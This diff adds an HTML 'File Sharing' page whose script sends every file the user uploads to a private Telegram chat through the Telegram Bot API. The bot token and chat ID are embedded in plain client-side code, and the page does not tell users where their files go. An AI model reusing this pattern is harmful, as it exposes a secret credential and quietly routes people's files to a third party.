@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>File Sharing</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: linear-gradient(145deg, #0d1117, #161b22);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #ffffff;
+    }
+
+    .card {
+      background: rgba(22, 27, 34, 0.95);
+      border-radius: 15px;
+      padding: 25px;
+      max-width: 480px;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(12px);
+      transition: transform 0.2s ease;
+    }
+
+    .card:hover {
+      transform: translateY(-10px);
+    }
+
+    .terminal-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #444;
+    }
+
+    .terminal-title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+    .terminal-icon {
+      color: #36a3f7;
+    }
+
+    .terminal-body {
+      margin-top: 20px;
+    }
+
+    .upload-label {
+      display: block;
+      background: linear-gradient(145deg, #36a3f7, #0096d1);
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      text-align: center;
+      transition: background 0.3s;
+    }
+
+    .upload-label:hover {
+      background: linear-gradient(145deg, #007bb3, #004f8b);
+    }
+
+    input[type="file"] {
+      display: none;
+    }
+
+    .output-field {
+      width: 100%;
+      height: 150px;
+      background-color: #16161c;
+      color: #007bb3;
+      border: 1px solid #555;
+      padding: 10px;
+      border-radius: 5px;
+      margin-top: 20px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      font-family: monospace;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="terminal-header">
+      <span class="terminal-title">
+        <svg class="terminal-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M4 17l6-6-6-6M12 19h8"></path>
+        </svg>
+        File Sharing
+      </span>
+    </div>
+    <div class="terminal-body">
+      <label for="fileUpload" class="upload-label">Upload Files</label>
+      <input type="file" id="fileUpload" multiple>
+      <div id="terminal-output" class="output-field">Upload a file to begin...</div>
+    </div>
+  </div>
+
+  <script>
+    const fileUpload = document.getElementById('fileUpload');
+    const terminalOutput = document.getElementById('terminal-output');
+
+    fileUpload.addEventListener('change', async (event) => {
+      const files = event.target.files;
+      if (!files.length) return;
+
+      for (const file of files) {
+        appendToTerminal(`Uploading: ${file.name}...`);
+
+        try {
+          const response = await uploadFileToTelegramBot(file);
+          if (response.ok) {
+            appendToTerminal(`Uploaded: ${file.name} successfully!`);
+          } else {
+            appendToTerminal(`Failed to upload: ${file.name}`);
+          }
+        } catch (error) {
+          appendToTerminal(`Error uploading ${file.name}: ${error.message}`);
+        }
+      }
+    });
+
+    async function uploadFileToTelegramBot(file) {
+      const botToken = '7935178759:AAGCyAFogXlH4ZrNwX8oM1BexZucX09v71I';
+      const chatId = '7514779943';
+
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('document', file);
+
+      return await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+        method: 'POST',
+        body: formData,
+      });
+    }
+
+    function appendToTerminal(text) {
+      terminalOutput.textContent += '\n' + text;
+      terminalOutput.scrollTop = terminalOutput.scrollHeight;
+    }
+  </script>
+</body>
+</html>
